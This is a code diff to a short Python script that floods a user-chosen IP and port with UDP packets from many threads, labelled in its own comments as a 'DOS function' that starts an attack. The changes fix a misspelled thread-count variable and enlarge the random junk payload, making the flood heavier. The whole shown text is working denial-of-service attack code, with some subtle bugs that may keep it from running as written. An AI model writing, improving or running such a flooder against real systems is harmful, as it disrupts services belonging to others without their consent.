@@ -5,7 +5,7 @@ from threading import Thread
 
 UDP_IP = input("TARGET IP:")
 UDP_PORT = input("TARGET PORT:")
-Thears = input("Theards:")
+Threads = input("Threads:")
 
 message = ""
 msgcol = 0
@@ -13,7 +13,7 @@ chars = string.ascii_letters + string.digits
 
 #Generation pocket
 password =''
-for i in range(9999):
+for i in range(15872):
     password += random.choice(chars)
 
 #Preparing to send
@@ -27,6 +27,6 @@ def bye(): # DOS function
         msgcol = msgcol + 1 
         print ("1 message send total:" + msgcol)
 
-for i in range(Thears): #Start Attack
+for i in range(Threads): #Start Attack
     th = Thread(target=bye)
     th.start()
